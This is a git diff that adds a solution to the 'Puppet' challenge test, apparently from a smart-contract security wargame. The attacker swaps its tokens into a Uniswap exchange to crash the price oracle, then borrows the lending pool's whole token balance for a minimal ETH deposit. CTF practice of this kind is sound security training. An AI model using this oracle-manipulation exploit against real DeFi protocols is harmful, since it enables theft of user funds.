@@ -103,6 +103,20 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /*const AaronPuppetFactory = await ethers.getContractFactory('AaronPuppet', attacker);
+        this.aaron = await AaronPuppetFactory.deploy(this.lendingPool.address, 123000000000);
+        await this.aaron.pwn();*/
+        /*console.log("lending ", POOL_INITIAL_TOKEN_BALANCE);
+        await this.lendingPool.connect(attacker).borrow(
+            0,
+            {value: 123000000000}
+        );*/
+        this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, (await ethers.provider.getBlock('latest')).timestamp * 2);
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE, 
+            {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}
+        );
     });
 
     after(async function () {
